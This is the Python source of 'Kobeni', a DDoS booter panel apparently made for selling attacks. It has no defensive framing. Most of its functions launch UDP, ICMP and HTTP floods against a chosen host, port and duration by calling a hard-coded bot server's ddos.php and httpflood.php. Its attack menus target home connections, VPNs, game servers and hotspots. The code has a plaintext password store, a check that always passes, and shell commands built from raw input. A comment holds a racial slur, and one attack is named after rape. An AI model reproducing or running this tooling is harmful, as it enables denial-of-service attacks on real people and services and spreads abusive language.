#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#Made for CENTOS 7
#Made By Sage#8437 

##############################
# To Do List.\/ \/ \/ \/ \/ \/
##############################
# RE BRAND NIGGGGGERRRR
# Organize this awful shit.
# Better attack sending.
# Better Bot Adding??
# Black List IP addresses like if ip == then do something or other :shrug:
# track the users better  ^ ^^^^ ^ ^^ ^^^
# Maybe Animations?
# ./BASHRC EDITING!!!!!!
##############################

import time
import os
import socket
from typing import Text
import requests
from os import system
from random import *
from getpass import getpass

def purplepink(text):
    system(""); faded = ""
    red = 20
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

botcount = 2
parsecount = str(botcount)
Bots = ["149.57.191.193"]
Passwd = "HeliosoBuilt"
Key = "Kobeni1337"


def STOP(): 
    with open('attacklog.txt', 'a') as f:
      f.write('STOP\n')
    os.system('screen -dm curl "'+Bots[0]+'/stop.php?Key=Hellishere"'),
    


def UDP(Host, Port, Time,):  
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|UDP|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=1024&time='+Time+'&type=UDP"'),
  
 
   
def NUT(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|NUT|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=600&time='+Time+'&type=UDP"'),
   
   
def ICMP(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|ICMP|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=1024&time='+Time+'&type=ICMP"'),

   
def UDPMIX(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|UDPMIX|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=1024&time='+Time+'&type=UDP"'),
   
def HOME(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|HOME|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=250&time='+Time+'&type=NUT"'),
   

def HOME_LAG(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|HOME-LAG|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=125&time='+Time+'&type=NUT"'),
    

def HOME_NULL(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|HOME-NULL|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=125&time='+Time+'&type=UDP"'),
   

def VPN(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|VPN|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=650&time='+Time+'&type=NUT"'),
 

def VPN_LAG(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|VPN-LAG|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=450&time='+Time+'&type=NUT"'),
   

def VPN_NULL(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|VPN-NULL|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=12000&time='+Time+'&type=NUT"'),
    

def GAME_LAG(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|GAME-LAG|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=65500&time='+Time+'&type=NUT"'),
   

def NUKE(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|NUKE|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=65500&time='+Time+'&type=NUT"'),
    

def HOTSPOT_LAG(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|HOTSPOT-LAG|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=65500&time='+Time+'&type=NUT"'),
    

def RAPE(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|RAPE|\n')
    os.system('screen -dm curl "'+Bots[0]+'/ddos.php?Key=Hellishere&host='+Host+'&port='+Port+'&bytes=65500&time='+Time+'&type=UDP"'),
    

def HTTP(Host, Port, Time,):
    with open('attacklog.txt', 'a') as f:
      f.write('|'+Host+'|'+Port+'|'+Time+'|HTTP|\n')
    os.system('screen -dm curl "'+Bots[0]+'/httpflood.php?Key=Hellishere&host='+Host+'&port='+Port+'&time='+Time+'&type=HTTP'),
    

def ping(Host):
    if Host == "": {
    print ("\033[95m════► Invailed Argument."),
    main()
    }
    else :
        try:
            os.system('ping -c 4 '+Host)
        except:
            print ("\033[95m════► Invailed Host."),
            main()

def request_info(url):
	request = requests.get(url)
	response = request.text
	for line in response.splitlines():
            print(line)

def geoip(Host):
    if Host == "": {
    print ("\033[95m════► Invailed Argument."),
    main()
    }
    else :
        try:
            url = "https://api.hackertarget.com/geoip/?q="+Host
            requests.get(url)
            request_info(url)
        except:
            print ("\033[95m════► Invailed Argument."),
            main()
    


def Resolve(Host):
    if Host == "": {
         print ("\033[95m════► Invailed Argument."),
             main()
    }
    else :
        try:
            host_ip = socket.gethostbyname(Host)
            print ("\033[95m════► Host: {} \033[00m[\033[95mConverted\033[00m] {}\n".format (Host, host_ip))
            main()
        except:
             print ("\033[95m════► Invailed Argument."),
             main()

extras = """                                                        
                                
                                ┌─┐─┐ ┬┌┬┐┬─┐┌─┐┌─┐
                                ├┤ ┌┴┬┘ │ ├┬┘├─┤└─┐
                                └─┘┴ └─ ┴ ┴└─┴ ┴└─┘           
                          ═╦═══════════════════════════╦═
               ╔═══════════╩═╦═════════════════════════╩═══════════╗
               ║ Resolve     ║ Grabs A Domains IP.                 ║
               ║ Lookup      ║ Lookup An Ip Address.               ║
               ║ Ping        ║ ICMP pings an IP.                   ║
               ╚═════════════╩═════════════════════════════════════╝
"""

methods1 = """                           
                            ┌┬┐┌─┐┌┬┐┬ ┬┌─┐┌┬┐┌─┐  
                            │││├┤  │ ├─┤│ │ ││└─┐  
                            ┴ ┴└─┘ ┴ ┴ ┴└─┘─┴┘└─┘  
    ╔════════════════╗╔════════════════╗╔════════════════╗╔════════════════╗
    ║ NUT            ║║ HOME           ║║ HOME-LAG       ║║ HTTP           ║
    ║ UDP            ║║ HOME-NULL      ║║ VPN-LAG        ║║ RAPE           ║
    ║ ICMP           ║║ VPN            ║║ GAME-LAG       ║║ OVH            ║
    ║ UDPMIX         ║║ VPN-NULL       ║║ NUKE           ║║ NFO            ║
    ╚════════════════╝╚════════════════╝╚════════════════╝╚════════════════╝
"""
def create_account(username, password): 
    file="database.txt"
    with open(file, 'a') as myFile:
        myFile.write(username + ',' + password+ '\n')

def delattack(file='attacklog.txt'):
    os.remove(file)
    with open(file, 'a') as myFile:
        myFile.write('\n')

def delete_account(account, password):
    file="database.txt"
    with open(file, 'r') as myFile:
        text = myFile.read()
    text = text.replace(account + ':' + password, '')
    with open(file, 'w') as myFile:
        myFile.write(text)

def addban():
    admintxt = """                         
                                    ┌─┐┌┬┐┌┬┐┬┌┐┌
                                    ├─┤ │││││││││
                                    ┴ ┴─┴┘┴ ┴┴┘└┘
                           ═╦═══════════════════════════╦═
                ╔═══════════╩═╦═════════════════════════╩═══════════╗
                ║ Useradd     ║ Adds user.                          ║
                ║ Userdel     ║ deletes user.                       ║
                ║ W           ║ Shows Currently Connected.          ║
                ║ Users       ║ Shows Users.                        ║
                ║ Ban         ║ bans user(IP BAN).                  ║
                ║ Bans        ║ Shows bans.                         ║
                ║ Delatt      ║ Deletes Attacks.                    ║
                ║ Attacks     ║ Shows Attack Log.                   ║
                ║ Unban       ║ Unbans user.                        ║
                ║ Return      ║ Returns Back to Kobeni.             ║
                ╚═════════════╩═════════════════════════════════════╝

            """
    print(purplepink(admintxt))
def unban(host):
    file="banLog.txt"
    with open(file, 'r') as myFile:
        text = myFile.read()

    text = text.replace(host, '')

    with open(file, 'w') as myFile:
        myFile.write(text)
def admin():
    try:
            try:
                print("\033[95m╔═══𝓐𝓭𝓶𝓲𝓷═══║ ")
                Timid = input("\033[95m╚═══► ").lower()    
                Kobeni = Timid.split(" ")[0]
            except:
                print ("\033[95m════► Keyboard Interrupt"),
                admin()
            if Kobeni == "useradd":  
                try:
                    Kobeni, username, password = Timid.split(" ")
                    create_account(username, password)
                    admin()
                except ValueError:
                     print ("\033[95m════► Invailed Arguments."),
                     admin()
            elif Kobeni == "userdel":  
                try:
                    Kobeni, account, password = Timid.split(" ")
                    delete_account(account, password)
                    admin()
                except ValueError:
                     print ("\033[95m════► Invailed Arguments."),
                     admin()
            elif Kobeni == "help":                     
                    addban()
                    admin()
     
            elif Kobeni == "attacks": {    
                os.system('cd /run/sshd'),
                os.system("cat attacklog.txt"),
                os.system('cd /root/'),
                admin()
            }
            elif Kobeni == "w":  
                    os.system('w')
                    admin()
            elif Kobeni == "clear": {
                os.system('clear'),
                addban(),
                admin()
            }
            elif Kobeni == "delatt": {
                delattack(),
                admin()
            }
            elif Kobeni == "users": {
                os.system('cd /run/sshd'),
                os.system('cat database.txt'),
                os.system('cd /root/'),
                admin()
            }
          
            elif Kobeni == "cls": {
                os.system('clear'),
                addban(),
                admin()
            }
            elif Kobeni == "exit": {
                print ("\033[95m════► You Are Exiting Out Of Kobeni.\n"),
                time.sleep(1),     			
            }
            elif Kobeni == "logout":{
                print ("\033[95m════► You Are Exiting Out Of Kobeni.\n"),
                time.sleep(1),	
            }
            elif Kobeni == "&": {
                print ("\033[95m════► You Are Exiting Out Of Kobeni.\n"),
                time.sleep(1),
            }
            elif Kobeni == "bans": {
                 os.system('cd /run/sshd'),
                os.system('cat banLog.txt'),
                os.system('cd /root/'),
                admin()
            }
            elif Kobeni == "ban":  
                try:
                    Kobeni, host, = Timid.split(" ")
                    os.system('iptables -A INPUT -s '+host+' -j DROP')
                    os.system('iptables -A OUTPUT -s '+host+' -j DROP')
                    with open('banLog.txt', 'a') as f:
                        f.write(host+'\n')
                    admin()
                except ValueError:
                     print ("\033[95m════► Invailed Arguments."),
            elif Kobeni == "unban":  
                try:
                    Kobeni, host, = Timid.split(" ")
                    os.system('iptables -D INPUT -s '+host+' -j DROP')
                    os.system('iptables -D OUTPUT -s '+host+' -j DROP')
                    unban(host),
                    admin()
                except ValueError:
                     print ("\033[95m════► Invailed Arguments."),
            elif Kobeni == "return":{
                banner(),
                main()
            }
            else: 
                print("\033[94════► " +Kobeni+" Is Not A Command"),     
                admin()  
    except KeyboardInterrupt: 
         print ("\033[95m════► Keyboard Interrupt."),
         main()

info = """         
                                    ┬┌┐┌┌─┐┌─┐
                                    ││││├┤ │ │
                                    ┴┘└┘└  └─┘
                          ═╦═══════════════════════════╦═
               ╔═══════════╩═══════════════════════════╩═══════════╗
               ║ Made By Sage#8437                                 ║
               ║ Made 100% In Python 500+ Lines                    ║
               ║ Members: 2                                        ║
               ╚═══════════════════════════════════════════════════╝
"""

tos = """
                                   ┌┬┐┌─┐┌─┐
                                    │ │ │└─┐
                                    ┴ └─┘└─┘                    
               ╔════════════════════════════════════════════════╗
                 • YOURE NOT ALLOWED TO HIT GOV ORGANIZATIONS •
                 • YOU CAN ONLY SEND ONE ATTACK TO THE TARGET •
                 • DO NOT SHARE LOGINS FOR ANYONE OR ANYTHING •
                 • HITTING DSTAT SERVERS WILL RESULT IN A BAN •
                 • USE COMMON SENSE - NOT FOLLOWING TOS = BAN •
               ╚════════════════════════════════════════════════╝     
"""

help = """                   
                                    ┬ ┬┌─┐┬  ┌─┐
                                    ├─┤├┤ │  ├─┘
                                    ┴ ┴└─┘┴─┘┴           
                          ═╦═══════════════════════════╦═
               ╔═══════════╩═╦═════════════════════════╩═══════════╗
               ║ Methods     ║ Shows Methods For Kobeni.           ║
               ║ Extras      ║ Shows More Commands For Kobeni.     ║
               ║ Info        ║ Shows Botnet Info.                  ║
               ║ TOS         ║ Shows Kobeni TOS.                   ║
               ║ STOP        ║ Stops All Ongoing Attacks.          ║
               ║ Clear       ║ Clears Your terminal.               ║
               ║ Exit        ║ Exits Out Of Kobeni.                ║
               ╚═════════════╩═════════════════════════════════════╝
"""

os.system('printf "\033]0;%s%s%s\007" "Welcome to | Kobeni | Connected: 1 | " ')
os.system ("clear")
         
def banner():
    text = """
                                ┬┌─┌─┐┌┐ ┌─┐┌┐┌┬
                                ├┴┐│ │├┴┐├┤ ││││
                                ┴ ┴└─┘└─┘└─┘┘└┘┴                       
                      ══╦══════════════════════════════╦══
                 ╔══════╩══════════════════════════════╩══════╗
                 ║   Welcome To The Start Screen Of Kobeni!   ║
                 ║ - - -        Made By Sage#8437       - - - ║
               ╔═╩════════════════════════════════════════════╩═╗
              ╔╩════════════════════════════════════════════════╩╗
              ║ -  Type [help] to see all of Kobeni Commands   - ║
              ║ - Copyright © 2023 Kobeni All Rights Reserved  - ║
              ╚══════════════════════════════════════════════════╝  
                                       
"""
    print(purplepink(text))
    
logine = """
                                  ┬  ┌─┐┌─┐┬┌┐┌
                                  │  │ ││ ┬││││
                                  ┴─┘└─┘└─┘┴┘└┘
               ╔════════════════════════════════════════════════╗
                 • YOURE NOT ALLOWED TO HIT GOV ORGANIZATIONS •
                 • YOU CAN ONLY SEND ONE ATTACK TO THE TARGET •
                 • DO NOT SHARE LOGIN INFORMATION FOR ANYBODY •
                 • HITTING DSTAT SERVERS WILL RESULT IN A BAN •
                 • USE COMMON SENSE - NOT FOLLOWING TOS = BAN •
               ╚════════════════════════════════════════════════╝     

"""


def login(file="database.txt"):
    print(purplepink(logine))
    print("\033[95m╔═══𝓤𝓼𝓮𝓻𝓷𝓪𝓶𝓮═══║ ")
    account = input("\033[95m╚═══► ")
    print("\033[95m╔═══𝓟𝓪𝓼𝓼𝔀𝓸𝓻𝓭═══║ ") 
    password = getpass("\033[95m╚═══► ") 

    with open(file, 'r') as myFile:
        text = myFile.read()

    find_account = text.find(account + ':' + password + '\n')

    if find_account != -1:
        os.system('clear')
        os.system('printf "\033]0;%s%s%s\007" "Welcome '+account+' | Kobeni | Connected: 1 | " ')
        banner()
        main()
    else:
        print ('\033[95m════► Incorrect Login')
        time.sleep(1)
        exit()

def main():
    try:
        print("\033[95m╔═══𝓚𝓸𝓫𝓮𝓷𝓲═══║ ")
        Timid = input("\033[95m╚═══► ").lower()    
        Kobeni = Timid.split(" ")[0]
    except:
        print ("\033[95m════► Keyboard Interrupt"),
        main()
    if Kobeni == "clear":  {
             os.system ("clear"),
			banner(),
			main()
    } 
    elif Kobeni == "cls": {
             os.system ("clear"),
			banner(),
			main()
    }	       
    elif Kobeni == "help": {
        print(purplepink(help)),
        main()
    }
    elif Kobeni == "?": {
        print(help),
        main()
    }
    elif Kobeni == "methods": 
        try:          
            print(purplepink(methods1)),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments."),
            main()
    elif Kobeni == "exit": {
        print ("\033[95m════► You Are Exiting Out Of Kobeni.\n"),
        time.sleep(1),     	
    }
    elif Kobeni == "logout":{
        print ("\033[95m════► You Are Exiting Out Of Kobeni.\n"),
        time.sleep(1),		
    }
    elif Kobeni == "&": {
        print ("\033[95m════► You Are Exiting Out Of Kobeni.\n"),
        time.sleep(1),		
    }
    elif Kobeni == "extras": {
        print(purplepink(extras)),
        main()
    }   
    elif Kobeni == "tos":{
        print(purplepink(tos)),
        main()
    }
    elif Kobeni == "ping": 
        try:
            Kobeni, Host = Timid.split(" ")
            ping(Host),
            main() 
        except ValueError:   
            print ("\033[95m════► Invailed Arguments."),
            main()
            
    elif Kobeni == "info": {
        print(purplepink(info)),
        main()
    }
    elif Kobeni == "stop": {
        STOP(),
        main()
    }
    elif Kobeni == "resolve": 
        try:
            Kobeni, Host = Timid.split(" ")
            Resolve(Host),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments."),
            main()
    elif Kobeni == "lookup": 
        try:
            Kobeni, Host = Timid.split(" ")
            geoip(Host),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments."),
            main()
    elif Kobeni == "udp":
        try:
            Kobeni, Host, Port, Time,  = Timid.split(" ")
            UDP(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n UDP (IP) (PORT) (TIME) "),
            main()
    elif Kobeni == "udpmix":
        try:
            Kobeni, Host, Port, Time,  = Timid.split(" ")
            UDPMIX(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n UDPMIX (IP) (PORT) (TIME) "),
            main()
    elif Kobeni == "nut": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            NUT(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n NUT (IP) (PORT) (TIME) "),
            main()  
    elif Kobeni == "home": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            HOME(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n HOME (IP) (PORT) (TIME) "),
            main()
    elif Kobeni == "home-lag": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            HOME_LAG(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n HOME-LAG (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "home-null": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            HOME_NULL(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n HOME-NULL (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "vpn": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            VPN(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n VPN (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "vpn-lag": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            VPN_LAG(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n VPN-LAG (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "vpn-null": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            VPN_NULL(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n VPN-NULL (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "game-lag": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            GAME_LAG(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n GAME-LAG (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "nuke": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            NUKE(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n NUKE (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "hotspot-lag": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            HOTSPOT_LAG(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n HOTSPOT-LAG (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "rape": 
        try:
            Kobeni, Host, Port,  Time, = Timid.split(" ")
            RAPE(Host, Port, Time, ),
            main()
        except ValueError:   
            print ("\033[95m════► Invailed Arguments. \n RAPE (IP) (PORT) (TIME) "),
            main() 
    elif Kobeni == "icmp": 
        try:
            Kobeni, Host, Port, Time,  = Timid.split(" ")
            ICMP(Host, Port, Time, ),
            main()
        except ValueError:  
            print ("\033[95m════► Invailed Arguments. \n ICMP (IP) (PORT) (TIME) "),
            main()
    elif Kobeni == "admin": 
        try:   
            Kobeni, Password = Timid.split(" ")
            if Passwd != Passwd: 
                print("\033[95m════► " +Kobeni+" Is Not A Command"),
                main()
            else:           
                os.system("clear")
                addban(),
                admin(),
                main()
        except ValueError:
            print("\033[95m════► " +Kobeni+" Is Not A Command"),   
            main()
    else: {
        print("\033[95m════► " +Kobeni+" Is Not A Command"),     
        main() 
    }

login()	
